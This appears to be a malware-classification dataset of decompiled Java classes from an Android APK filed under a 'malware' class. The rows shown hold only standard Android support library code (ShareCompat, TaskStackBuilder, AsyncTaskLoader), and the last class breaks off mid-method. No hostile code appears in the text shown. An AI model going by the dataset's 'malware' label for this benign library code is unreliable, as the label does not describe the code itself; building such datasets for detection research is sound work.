"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\ServiceCompat.code","public class ServiceCompat {   public static final int START_STICKY=1;   private ServiceCompat(){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\SetIndicatorInfo.code","private static class SetIndicatorInfo {   public Method setHomeActionContentDescription;   public Method setHomeAsUpIndicator;   public ImageView upIndicatorView;   SetIndicatorInfo(  Activity activity){     try {       this.setHomeAsUpIndicator=ActionBar.class.getDeclaredMethod(""setHomeAsUpIndicator"",Drawable.class);       this.setHomeActionContentDescription=ActionBar.class.getDeclaredMethod(""setHomeActionContentDescription"",Integer.TYPE);     }  catch (    NoSuchMethodException e) {       View home=activity.findViewById(R.id.home);       if (home != null) {         ViewGroup parent=(ViewGroup)home.getParent();         int childCount=parent.getChildCount();         if (childCount == 2) {           View first=parent.getChildAt(0);           View second=parent.getChildAt(1);           View up=first.getId() == 16908332 ? second : first;           if (up instanceof ImageView) {             this.upIndicatorView=(ImageView)up;           }         }       }     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\ShareCompat.code","public class ShareCompat {   public static final String EXTRA_CALLING_ACTIVITY=""android.support.v4.app.EXTRA_CALLING_ACTIVITY"";   public static final String EXTRA_CALLING_PACKAGE=""android.support.v4.app.EXTRA_CALLING_PACKAGE"";   private static ShareCompatImpl IMPL; public interface ShareCompatImpl {     void configureMenuItem(    MenuItem menuItem,    IntentBuilder intentBuilder);     String escapeHtml(    CharSequence charSequence);   } static class ShareCompatImplBase implements ShareCompatImpl {     ShareCompatImplBase(){     }     @Override public void configureMenuItem(    MenuItem item,    IntentBuilder shareIntent){       item.setIntent(shareIntent.createChooserIntent());     }     @Override public String escapeHtml(    CharSequence text){       StringBuilder out=new StringBuilder();       withinStyle(out,text,0,text.length());       return out.toString();     }     private static void withinStyle(    StringBuilder out,    CharSequence text,    int start,    int end){       int i=start;       while (i < end) {         char c=text.charAt(i);         if (c == '<') {           out.append(""&lt;"");         }  else         if (c == '>') {           out.append(""&gt;"");         }  else         if (c == '&') {           out.append(""&amp;"");         }  else         if (c > '~' || c < ' ') {           out.append(""&#"" + ((int)c) + "";"");         }  else         if (c == ' ') {           while (i + 1 < end && text.charAt(i + 1) == ' ') {             out.append(""&nbsp;"");             i++;           }           out.append(' ');         }  else {           out.append(c);         }         i++;       }     }   } static class ShareCompatImplICS extends ShareCompatImplBase {     ShareCompatImplICS(){     }     @Override public void configureMenuItem(    MenuItem item,    IntentBuilder shareIntent){       ShareCompatICS.configureMenuItem(item,shareIntent.getActivity(),shareIntent.getIntent());       if (shouldAddChooserIntent(item)) {         item.setIntent(shareIntent.createChooserIntent());       }     }     boolean shouldAddChooserIntent(    MenuItem item){       return !item.hasSubMenu();     }   } static class ShareCompatImplJB extends ShareCompatImplICS {     ShareCompatImplJB(){     }     @Override public String escapeHtml(    CharSequence html){       return ShareCompatJB.escapeHtml(html);     }     @Override boolean shouldAddChooserIntent(    MenuItem item){       return false;     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new ShareCompatImplJB();     }  else     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new ShareCompatImplICS();     }  else {       IMPL=new ShareCompatImplBase();     }   }   public static String getCallingPackage(  Activity calledActivity){     String result=calledActivity.getCallingPackage();     if (result == null) {       return calledActivity.getIntent().getStringExtra(EXTRA_CALLING_PACKAGE);     }     return result;   }   public static ComponentName getCallingActivity(  Activity calledActivity){     ComponentName result=calledActivity.getCallingActivity();     if (result == null) {       return (ComponentName)calledActivity.getIntent().getParcelableExtra(EXTRA_CALLING_ACTIVITY);     }     return result;   }   public static void configureMenuItem(  MenuItem item,  IntentBuilder shareIntent){     IMPL.configureMenuItem(item,shareIntent);   }   public static void configureMenuItem(  Menu menu,  int menuItemId,  IntentBuilder shareIntent){     MenuItem item=menu.findItem(menuItemId);     if (item == null) {       throw new IllegalArgumentException(""Could not find menu item with id "" + menuItemId + "" in the supplied menu"");     }     configureMenuItem(item,shareIntent);   } public static class IntentBuilder {     private Activity mActivity;     private ArrayList<String> mBccAddresses;     private ArrayList<String> mCcAddresses;     private CharSequence mChooserTitle;     private Intent mIntent=new Intent().setAction(""android.intent.action.SEND"");     private ArrayList<Uri> mStreams;     private ArrayList<String> mToAddresses;     public static IntentBuilder from(    Activity launchingActivity){       return new IntentBuilder(launchingActivity);     }     private IntentBuilder(    Activity launchingActivity){       this.mActivity=launchingActivity;       this.mIntent.putExtra(ShareCompat.EXTRA_CALLING_PACKAGE,launchingActivity.getPackageName());       this.mIntent.putExtra(ShareCompat.EXTRA_CALLING_ACTIVITY,launchingActivity.getComponentName());       this.mIntent.addFlags(AccessibilityEventCompat.TYPE_GESTURE_DETECTION_END);     }     public Intent getIntent(){       if (this.mToAddresses != null) {         combineArrayExtra(""android.intent.extra.EMAIL"",this.mToAddresses);         this.mToAddresses=null;       }       if (this.mCcAddresses != null) {         combineArrayExtra(""android.intent.extra.CC"",this.mCcAddresses);         this.mCcAddresses=null;       }       if (this.mBccAddresses != null) {         combineArrayExtra(""android.intent.extra.BCC"",this.mBccAddresses);         this.mBccAddresses=null;       }       boolean needsSendMultiple=this.mStreams != null && this.mStreams.size() > 1;       boolean isSendMultiple=this.mIntent.getAction().equals(""android.intent.action.SEND_MULTIPLE"");       if (!needsSendMultiple && isSendMultiple) {         this.mIntent.setAction(""android.intent.action.SEND"");         if (this.mStreams != null && !this.mStreams.isEmpty()) {           this.mIntent.putExtra(""android.intent.extra.STREAM"",this.mStreams.get(0));         }  else {           this.mIntent.removeExtra(""android.intent.extra.STREAM"");         }         this.mStreams=null;       }       if (needsSendMultiple && !isSendMultiple) {         this.mIntent.setAction(""android.intent.action.SEND_MULTIPLE"");         if (this.mStreams != null && !this.mStreams.isEmpty()) {           this.mIntent.putParcelableArrayListExtra(""android.intent.extra.STREAM"",this.mStreams);         }  else {           this.mIntent.removeExtra(""android.intent.extra.STREAM"");         }       }       return this.mIntent;     }     Activity getActivity(){       return this.mActivity;     }     private void combineArrayExtra(    String extra,    ArrayList<String> add){       String[] currentAddresses=this.mIntent.getStringArrayExtra(extra);       int currentLength=currentAddresses != null ? currentAddresses.length : 0;       String[] finalAddresses=new String[add.size() + currentLength];       add.toArray(finalAddresses);       if (currentAddresses != null) {         System.arraycopy(currentAddresses,0,finalAddresses,add.size(),currentLength);       }       this.mIntent.putExtra(extra,finalAddresses);     }     private void combineArrayExtra(    String extra,    String[] add){       Intent intent=getIntent();       String[] old=intent.getStringArrayExtra(extra);       int oldLength=old != null ? old.length : 0;       String[] result=new String[add.length + oldLength];       if (old != null) {         System.arraycopy(old,0,result,0,oldLength);       }       System.arraycopy(add,0,result,oldLength,add.length);       intent.putExtra(extra,result);     }     public Intent createChooserIntent(){       return Intent.createChooser(getIntent(),this.mChooserTitle);     }     public void startChooser(){       this.mActivity.startActivity(createChooserIntent());     }     public IntentBuilder setChooserTitle(    CharSequence title){       this.mChooserTitle=title;       return this;     }     public IntentBuilder setChooserTitle(    int resId){       return setChooserTitle(this.mActivity.getText(resId));     }     public IntentBuilder setType(    String mimeType){       this.mIntent.setType(mimeType);       return this;     }     public IntentBuilder setText(    CharSequence text){       this.mIntent.putExtra(""android.intent.extra.TEXT"",text);       return this;     }     public IntentBuilder setHtmlText(    String htmlText){       this.mIntent.putExtra(IntentCompat.EXTRA_HTML_TEXT,htmlText);       if (!this.mIntent.hasExtra(""android.intent.extra.TEXT"")) {         setText(Html.fromHtml(htmlText));       }       return this;     }     public IntentBuilder setStream(    Uri streamUri){       if (!this.mIntent.getAction().equals(""android.intent.action.SEND"")) {         this.mIntent.setAction(""android.intent.action.SEND"");       }       this.mStreams=null;       this.mIntent.putExtra(""android.intent.extra.STREAM"",streamUri);       return this;     }     public IntentBuilder addStream(    Uri streamUri){       Uri currentStream=(Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");       if (currentStream == null) {         return setStream(streamUri);       }       if (this.mStreams == null) {         this.mStreams=new ArrayList<>();       }       if (currentStream != null) {         this.mIntent.removeExtra(""android.intent.extra.STREAM"");         this.mStreams.add(currentStream);       }       this.mStreams.add(streamUri);       return this;     }     public IntentBuilder setEmailTo(    String[] addresses){       if (this.mToAddresses != null) {         this.mToAddresses=null;       }       this.mIntent.putExtra(""android.intent.extra.EMAIL"",addresses);       return this;     }     public IntentBuilder addEmailTo(    String address){       if (this.mToAddresses == null) {         this.mToAddresses=new ArrayList<>();       }       this.mToAddresses.add(address);       return this;     }     public IntentBuilder addEmailTo(    String[] addresses){       combineArrayExtra(""android.intent.extra.EMAIL"",addresses);       return this;     }     public IntentBuilder setEmailCc(    String[] addresses){       this.mIntent.putExtra(""android.intent.extra.CC"",addresses);       return this;     }     public IntentBuilder addEmailCc(    String address){       if (this.mCcAddresses == null) {         this.mCcAddresses=new ArrayList<>();       }       this.mCcAddresses.add(address);       return this;     }     public IntentBuilder addEmailCc(    String[] addresses){       combineArrayExtra(""android.intent.extra.CC"",addresses);       return this;     }     public IntentBuilder setEmailBcc(    String[] addresses){       this.mIntent.putExtra(""android.intent.extra.BCC"",addresses);       return this;     }     public IntentBuilder addEmailBcc(    String address){       if (this.mBccAddresses == null) {         this.mBccAddresses=new ArrayList<>();       }       this.mBccAddresses.add(address);       return this;     }     public IntentBuilder addEmailBcc(    String[] addresses){       combineArrayExtra(""android.intent.extra.BCC"",addresses);       return this;     }     public IntentBuilder setSubject(    String subject){       this.mIntent.putExtra(""android.intent.extra.SUBJECT"",subject);       return this;     }   } public static class IntentReader {     private static final String TAG=""IntentReader"";     private Activity mActivity;     private ComponentName mCallingActivity;     private String mCallingPackage;     private Intent mIntent;     private ArrayList<Uri> mStreams;     public static IntentReader from(    Activity activity){       return new IntentReader(activity);     }     private IntentReader(    Activity activity){       this.mActivity=activity;       this.mIntent=activity.getIntent();       this.mCallingPackage=ShareCompat.getCallingPackage(activity);       this.mCallingActivity=ShareCompat.getCallingActivity(activity);     }     public boolean isShareIntent(){       String action=this.mIntent.getAction();       return ""android.intent.action.SEND"".equals(action) || ""android.intent.action.SEND_MULTIPLE"".equals(action);     }     public boolean isSingleShare(){       return ""android.intent.action.SEND"".equals(this.mIntent.getAction());     }     public boolean isMultipleShare(){       return ""android.intent.action.SEND_MULTIPLE"".equals(this.mIntent.getAction());     }     public String getType(){       return this.mIntent.getType();     }     public CharSequence getText(){       return this.mIntent.getCharSequenceExtra(""android.intent.extra.TEXT"");     }     public String getHtmlText(){       String result=this.mIntent.getStringExtra(IntentCompat.EXTRA_HTML_TEXT);       if (result == null) {         CharSequence text=getText();         if (text instanceof Spanned) {           return Html.toHtml((Spanned)text);         }         if (text != null) {           return ShareCompat.IMPL.escapeHtml(text);         }         return result;       }       return result;     }     public Uri getStream(){       return (Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");     }     public Uri getStream(    int index){       if (this.mStreams == null && isMultipleShare()) {         this.mStreams=this.mIntent.getParcelableArrayListExtra(""android.intent.extra.STREAM"");       }       if (this.mStreams != null) {         return this.mStreams.get(index);       }       if (index == 0) {         return (Uri)this.mIntent.getParcelableExtra(""android.intent.extra.STREAM"");       }       throw new IndexOutOfBoundsException(""Stream items available: "" + getStreamCount() + "" index requested: ""+ index);     }     public int getStreamCount(){       if (this.mStreams == null && isMultipleShare()) {         this.mStreams=this.mIntent.getParcelableArrayListExtra(""android.intent.extra.STREAM"");       }       if (this.mStreams != null) {         return this.mStreams.size();       }       return this.mIntent.hasExtra(""android.intent.extra.STREAM"") ? 1 : 0;     }     public String[] getEmailTo(){       return this.mIntent.getStringArrayExtra(""android.intent.extra.EMAIL"");     }     public String[] getEmailCc(){       return this.mIntent.getStringArrayExtra(""android.intent.extra.CC"");     }     public String[] getEmailBcc(){       return this.mIntent.getStringArrayExtra(""android.intent.extra.BCC"");     }     public String getSubject(){       return this.mIntent.getStringExtra(""android.intent.extra.SUBJECT"");     }     public String getCallingPackage(){       return this.mCallingPackage;     }     public ComponentName getCallingActivity(){       return this.mCallingActivity;     }     public Drawable getCallingActivityIcon(){       if (this.mCallingActivity == null) {         return null;       }       PackageManager pm=this.mActivity.getPackageManager();       try {         return pm.getActivityIcon(this.mCallingActivity);       }  catch (      PackageManager.NameNotFoundException e) {         Log.e(TAG,""Could not retrieve icon for calling activity"",e);         return null;       }     }     public Drawable getCallingApplicationIcon(){       if (this.mCallingPackage == null) {         return null;       }       PackageManager pm=this.mActivity.getPackageManager();       try {         return pm.getApplicationIcon(this.mCallingPackage);       }  catch (      PackageManager.NameNotFoundException e) {         Log.e(TAG,""Could not retrieve icon for calling application"",e);         return null;       }     }     public CharSequence getCallingApplicationLabel(){       if (this.mCallingPackage == null) {         return null;       }       PackageManager pm=this.mActivity.getPackageManager();       try {         return pm.getApplicationLabel(pm.getApplicationInfo(this.mCallingPackage,0));       }  catch (      PackageManager.NameNotFoundException e) {         Log.e(TAG,""Could not retrieve label for calling application"",e);         return null;       }     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\ShareCompatICS.code","class ShareCompatICS {   private static final String HISTORY_FILENAME_PREFIX="".sharecompat_"";   ShareCompatICS(){   }   public static void configureMenuItem(  MenuItem item,  Activity callingActivity,  Intent intent){     ShareActionProvider provider;     ActionProvider itemProvider=item.getActionProvider();     if (!(itemProvider instanceof ShareActionProvider)) {       provider=new ShareActionProvider(callingActivity);     }  else {       provider=(ShareActionProvider)itemProvider;     }     provider.setShareHistoryFileName(HISTORY_FILENAME_PREFIX + callingActivity.getClass().getName());     provider.setShareIntent(intent);     item.setActionProvider(provider);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\ShareCompatImpl.code","public interface ShareCompatImpl {   void configureMenuItem(  MenuItem menuItem,  IntentBuilder intentBuilder);   String escapeHtml(  CharSequence charSequence); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\ShareCompatImplBase.code","static class ShareCompatImplBase implements ShareCompatImpl {   ShareCompatImplBase(){   }   @Override public void configureMenuItem(  MenuItem item,  IntentBuilder shareIntent){     item.setIntent(shareIntent.createChooserIntent());   }   @Override public String escapeHtml(  CharSequence text){     StringBuilder out=new StringBuilder();     withinStyle(out,text,0,text.length());     return out.toString();   }   private static void withinStyle(  StringBuilder out,  CharSequence text,  int start,  int end){     int i=start;     while (i < end) {       char c=text.charAt(i);       if (c == '<') {         out.append(""&lt;"");       }  else       if (c == '>') {         out.append(""&gt;"");       }  else       if (c == '&') {         out.append(""&amp;"");       }  else       if (c > '~' || c < ' ') {         out.append(""&#"" + ((int)c) + "";"");       }  else       if (c == ' ') {         while (i + 1 < end && text.charAt(i + 1) == ' ') {           out.append(""&nbsp;"");           i++;         }         out.append(' ');       }  else {         out.append(c);       }       i++;     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\ShareCompatImplICS.code","static class ShareCompatImplICS extends ShareCompatImplBase {   ShareCompatImplICS(){   }   @Override public void configureMenuItem(  MenuItem item,  IntentBuilder shareIntent){     ShareCompatICS.configureMenuItem(item,shareIntent.getActivity(),shareIntent.getIntent());     if (shouldAddChooserIntent(item)) {       item.setIntent(shareIntent.createChooserIntent());     }   }   boolean shouldAddChooserIntent(  MenuItem item){     return !item.hasSubMenu();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\ShareCompatImplJB.code","static class ShareCompatImplJB extends ShareCompatImplICS {   ShareCompatImplJB(){   }   @Override public String escapeHtml(  CharSequence html){     return ShareCompatJB.escapeHtml(html);   }   @Override boolean shouldAddChooserIntent(  MenuItem item){     return false;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\ShareCompatJB.code","class ShareCompatJB {   ShareCompatJB(){   }   public static String escapeHtml(  CharSequence html){     return Html.escapeHtml(html);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\SlideDrawable.code","public class SlideDrawable extends LevelListDrawable implements Drawable.Callback {   private final boolean mHasMirroring;   private float mOffset;   private float mPosition;   private final Rect mTmpRect;   private SlideDrawable(  Drawable wrapped){     this.mHasMirroring=Build.VERSION.SDK_INT > 18;     this.mTmpRect=new Rect();     if (DrawableCompat.isAutoMirrored(wrapped)) {       DrawableCompat.setAutoMirrored(this,true);     }     addLevel(0,0,wrapped);   }   public void setPosition(  float position){     this.mPosition=position;     invalidateSelf();   }   public float getPosition(){     return this.mPosition;   }   public void setOffset(  float offset){     this.mOffset=offset;     invalidateSelf();   }   @Override public void draw(  Canvas canvas){     copyBounds(this.mTmpRect);     canvas.save();     boolean isLayoutRTL=ViewCompat.getLayoutDirection(ActionBarDrawerToggle.this.mActivity.getWindow().getDecorView()) == 1;     int flipRtl=isLayoutRTL ? -1 : 1;     int width=this.mTmpRect.width();     canvas.translate((-this.mOffset) * width * this.mPosition* flipRtl,0.0f);     if (isLayoutRTL && !this.mHasMirroring) {       canvas.translate(width,0.0f);       canvas.scale(-1.0f,1.0f);     }     super.draw(canvas);     canvas.restore();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\Style.code","public static abstract class Style {   CharSequence mBigContentTitle;   Builder mBuilder;   CharSequence mSummaryText;   boolean mSummaryTextSet=false;   public void setBuilder(  Builder builder){     if (this.mBuilder != builder) {       this.mBuilder=builder;       if (this.mBuilder != null) {         this.mBuilder.setStyle(this);       }     }   }   public Notification build(){     if (this.mBuilder == null) {       return null;     }     Notification notification=this.mBuilder.build();     return notification;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\SuperNotCalledException.code","final class SuperNotCalledException extends AndroidRuntimeException {   public SuperNotCalledException(  String msg){     super(msg);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\SupportParentable.code","public interface SupportParentable {   Intent getSupportParentActivityIntent(); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\TabInfo.code","public static final class TabInfo {   private final Bundle args;   private final Class<?> clss;   private Fragment fragment;   private final String tag;   TabInfo(  String _tag,  Class<?> _class,  Bundle _args){     this.tag=_tag;     this.clss=_class;     this.args=_args;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\TaskStackBuilder.code","public class TaskStackBuilder implements Iterable<Intent> {   private static final TaskStackBuilderImpl IMPL;   private static final String TAG=""TaskStackBuilder"";   private final ArrayList<Intent> mIntents=new ArrayList<>();   private final Context mSourceContext; public interface SupportParentable {     Intent getSupportParentActivityIntent();   } public interface TaskStackBuilderImpl {     PendingIntent getPendingIntent(    Context context,    Intent[] intentArr,    int i,    int i2,    Bundle bundle);   } static class TaskStackBuilderImplBase implements TaskStackBuilderImpl {     TaskStackBuilderImplBase(){     }     @Override public PendingIntent getPendingIntent(    Context context,    Intent[] intents,    int requestCode,    int flags,    Bundle options){       Intent topIntent=new Intent(intents[intents.length - 1]);       topIntent.addFlags(268435456);       return PendingIntent.getActivity(context,requestCode,topIntent,flags);     }   } static class TaskStackBuilderImplHoneycomb implements TaskStackBuilderImpl {     TaskStackBuilderImplHoneycomb(){     }     @Override public PendingIntent getPendingIntent(    Context context,    Intent[] intents,    int requestCode,    int flags,    Bundle options){       intents[0]=new Intent(intents[0]).addFlags(268484608);       return TaskStackBuilderHoneycomb.getActivitiesPendingIntent(context,requestCode,intents,flags);     }   } static class TaskStackBuilderImplJellybean implements TaskStackBuilderImpl {     TaskStackBuilderImplJellybean(){     }     @Override public PendingIntent getPendingIntent(    Context context,    Intent[] intents,    int requestCode,    int flags,    Bundle options){       intents[0]=new Intent(intents[0]).addFlags(268484608);       return TaskStackBuilderJellybean.getActivitiesPendingIntent(context,requestCode,intents,flags,options);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new TaskStackBuilderImplHoneycomb();     }  else {       IMPL=new TaskStackBuilderImplBase();     }   }   private TaskStackBuilder(  Context a2){     this.mSourceContext=a2;   }   public static TaskStackBuilder create(  Context context){     return new TaskStackBuilder(context);   }   public static TaskStackBuilder from(  Context context){     return create(context);   }   public TaskStackBuilder addNextIntent(  Intent nextIntent){     this.mIntents.add(nextIntent);     return this;   }   public TaskStackBuilder addNextIntentWithParentStack(  Intent nextIntent){     ComponentName target=nextIntent.getComponent();     if (target == null) {       target=nextIntent.resolveActivity(this.mSourceContext.getPackageManager());     }     if (target != null) {       addParentStack(target);     }     addNextIntent(nextIntent);     return this;   }   public TaskStackBuilder addParentStack(  Activity activity){     Intent parent=null;     if (activity instanceof SupportParentable) {       parent=((SupportParentable)activity).getSupportParentActivityIntent();     }     if (parent == null) {       parent=NavUtils.getParentActivityIntent(activity);     }     if (parent != null) {       ComponentName target=parent.getComponent();       if (target == null) {         target=parent.resolveActivity(this.mSourceContext.getPackageManager());       }       addParentStack(target);       addNextIntent(parent);     }     return this;   }   public TaskStackBuilder addParentStack(  Class<?> sourceActivityClass){     return addParentStack(new ComponentName(this.mSourceContext,sourceActivityClass));   }   public TaskStackBuilder addParentStack(  ComponentName sourceActivityName){     int insertAt=this.mIntents.size();     try {       Intent parent=NavUtils.getParentActivityIntent(this.mSourceContext,sourceActivityName);       while (parent != null) {         this.mIntents.add(insertAt,parent);         parent=NavUtils.getParentActivityIntent(this.mSourceContext,parent.getComponent());       }       return this;     }  catch (    PackageManager.NameNotFoundException e) {       Log.e(TAG,""Bad ComponentName while traversing activity parent metadata"");       throw new IllegalArgumentException(e);     }   }   public int getIntentCount(){     return this.mIntents.size();   }   public Intent getIntent(  int index){     return editIntentAt(index);   }   public Intent editIntentAt(  int index){     return this.mIntents.get(index);   }   @Override public Iterator<Intent> iterator(){     return this.mIntents.iterator();   }   public void startActivities(){     startActivities(null);   }   public void startActivities(  Bundle options){     if (this.mIntents.isEmpty()) {       throw new IllegalStateException(""No intents added to TaskStackBuilder; cannot startActivities"");     }     Intent[] intents=(Intent[])this.mIntents.toArray(new Intent[this.mIntents.size()]);     intents[0]=new Intent(intents[0]).addFlags(268484608);     if (!ContextCompat.startActivities(this.mSourceContext,intents,options)) {       Intent topIntent=new Intent(intents[intents.length - 1]);       topIntent.addFlags(268435456);       this.mSourceContext.startActivity(topIntent);     }   }   public PendingIntent getPendingIntent(  int requestCode,  int flags){     return getPendingIntent(requestCode,flags,null);   }   public PendingIntent getPendingIntent(  int requestCode,  int flags,  Bundle options){     if (this.mIntents.isEmpty()) {       throw new IllegalStateException(""No intents added to TaskStackBuilder; cannot getPendingIntent"");     }     Intent[] intents=(Intent[])this.mIntents.toArray(new Intent[this.mIntents.size()]);     intents[0]=new Intent(intents[0]).addFlags(268484608);     return IMPL.getPendingIntent(this.mSourceContext,intents,requestCode,flags,options);   }   public Intent[] getIntents(){     Intent[] intents=new Intent[this.mIntents.size()];     if (intents.length != 0) {       intents[0]=new Intent(this.mIntents.get(0)).addFlags(268484608);       for (int i=1; i < intents.length; i++) {         intents[i]=new Intent(this.mIntents.get(i));       }     }     return intents;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\TaskStackBuilderHoneycomb.code","class TaskStackBuilderHoneycomb {   TaskStackBuilderHoneycomb(){   }   public static PendingIntent getActivitiesPendingIntent(  Context context,  int requestCode,  Intent[] intents,  int flags){     return PendingIntent.getActivities(context,requestCode,intents,flags);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\TaskStackBuilderImpl.code","public interface TaskStackBuilderImpl {   PendingIntent getPendingIntent(  Context context,  Intent[] intentArr,  int i,  int i2,  Bundle bundle); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\TaskStackBuilderImplBase.code","static class TaskStackBuilderImplBase implements TaskStackBuilderImpl {   TaskStackBuilderImplBase(){   }   @Override public PendingIntent getPendingIntent(  Context context,  Intent[] intents,  int requestCode,  int flags,  Bundle options){     Intent topIntent=new Intent(intents[intents.length - 1]);     topIntent.addFlags(268435456);     return PendingIntent.getActivity(context,requestCode,topIntent,flags);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\TaskStackBuilderImplHoneycomb.code","static class TaskStackBuilderImplHoneycomb implements TaskStackBuilderImpl {   TaskStackBuilderImplHoneycomb(){   }   @Override public PendingIntent getPendingIntent(  Context context,  Intent[] intents,  int requestCode,  int flags,  Bundle options){     intents[0]=new Intent(intents[0]).addFlags(268484608);     return TaskStackBuilderHoneycomb.getActivitiesPendingIntent(context,requestCode,intents,flags);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\TaskStackBuilderImplJellybean.code","static class TaskStackBuilderImplJellybean implements TaskStackBuilderImpl {   TaskStackBuilderImplJellybean(){   }   @Override public PendingIntent getPendingIntent(  Context context,  Intent[] intents,  int requestCode,  int flags,  Bundle options){     intents[0]=new Intent(intents[0]).addFlags(268484608);     return TaskStackBuilderJellybean.getActivitiesPendingIntent(context,requestCode,intents,flags,options);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\TaskStackBuilderJellybean.code","class TaskStackBuilderJellybean {   TaskStackBuilderJellybean(){   }   public static PendingIntent getActivitiesPendingIntent(  Context context,  int requestCode,  Intent[] intents,  int flags,  Bundle options){     return PendingIntent.getActivities(context,requestCode,intents,flags,options);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.content\AsyncTaskLoader.code","public abstract class AsyncTaskLoader<D> extends Loader<D> {   static final boolean DEBUG=false;   static final String TAG=""AsyncTaskLoader"";   volatile AsyncTaskLoader<D>.LoadTask mCancellingTask;   Handler mHandler;   long mLastLoadCompleteTime;   volatile AsyncTaskLoader<D>.LoadTask mTask;   long mUpdateThrottle;   public abstract D loadInBackground(); public final class LoadTask extends ModernAsyncTask<Void,Void,D> implements Runnable {     private CountDownLatch done=new CountDownLatch(1);     D result;     boolean waiting;     LoadTask(){     }     @Override public D doInBackground(    Void... voidArr){       this.result=(D)AsyncTaskLoader.this.onLoadInBackground();       return this.result;     }     @Override protected void onPostExecute(    D data){       try {         AsyncTaskLoader.this.dispatchOnLoadComplete(this,data);       }   finally {         this.done.countDown();       }     }     @Override protected void onCancelled(){       try {         AsyncTaskLoader.this.dispatchOnCancelled(this,this.result);       }   finally {         this.done.countDown();       }     }     @Override public void run(){       this.waiting=false;       AsyncTaskLoader.this.executePendingTask();     }   }   public AsyncTaskLoader(  Context context){     super(context);     this.mLastLoadCompleteTime=-10000L;   }   public void setUpdateThrottle(  long delayMS){     this.mUpdateThrottle=delayMS;     if (delayMS != 0) {       this.mHandler=new Handler();     }   }   @Override public void onForceLoad(){     super.onForceLoad();     cancelLoad();     this.mTask=new LoadTask();     executePendingTask();   }   public boolean cancelLoad(){     boolean cancelled=false;     if (this.mTask != null) {       if (this.mCancellingTask != null) {         if (this.mTask.waiting) {           this.mTask.waiting=false;           this.mHandler.removeCallbacks(this.mTask);         }         this.mTask=null;       }  else       if (this.mTask.waiting) {         this.mTask.waiting=false;         this.mHandler.removeCallbacks(this.mTask);         this.mTask=null;       }  else {         cancelled=this.mTask.cancel(false);         if (cancelled) {           this.mCancellingTask=this.mTask;         }         this.mTask=null;       }     }     return cancelled;   }   public void onCanceled(  D data){   }   void executePendingTask(){     if (this.mCancellingTask == null && this.mTask != null) {       if (this.mTask.waiting) {         this.mTask.waiting=false;         this.mHandler.removeCallbacks(this.mTask);       }       if (this.mUpdateThrottle > 0) {         long now=SystemClock.uptimeMillis();         if (now < this.mLastLoadCompleteTime + this.mUpdateThrottle) {           this.mTask.waiting=true;           this.mHandler.postAtTime(this.mTask,this.mLastLoadCompleteTime + this.mUpdateThrottle);           return;         }       }       this.mTask.executeOnExecutor(ModernAsyncTask.THREAD_POOL_EXECUTOR,(Void[])null);     }   }   void dispatchOnCancelled(  AsyncTaskLoader<D>.LoadTask task,  D data){     onCanceled(data);     if (this.mCancellingTask == task) {       rollbackContentChanged();       this.mLastLoadCompleteTime=SystemClock.uptimeMillis();       this.mCancellingTask=null;       executePendingTask();     }   }   void dispatchOnLoadComplete(  AsyncTaskLoader<D>.LoadTask task,  D data){     if (this.mTask != task) {       dispatchOnCancelled(task,data);       return;     }     if (isAbandoned()) {       